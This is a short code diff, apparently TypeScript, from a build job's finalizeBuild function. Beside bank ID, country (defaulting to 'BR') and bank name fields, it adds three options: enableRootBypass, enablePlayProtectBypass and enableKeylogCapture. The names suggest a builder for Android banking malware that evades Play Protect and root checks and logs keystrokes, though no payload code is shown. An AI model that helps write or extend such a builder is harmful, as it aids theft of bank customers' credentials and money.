@@ -309,6 +309,9 @@ async function finalizeBuild(job: BuildJob): Promise<void> {
         bankId: job.bankId ?? 'default',
         bankCountry: job.bankCountry ?? 'BR',
         bankName: job.bankName ?? 'Default Bank',
+        enableRootBypass: job.enableRootBypass,
+        enablePlayProtectBypass: job.enablePlayProtectBypass,
+        enableKeylogCapture: job.enableKeylogCapture,
       });
 
       const uploaded = await storagePut(
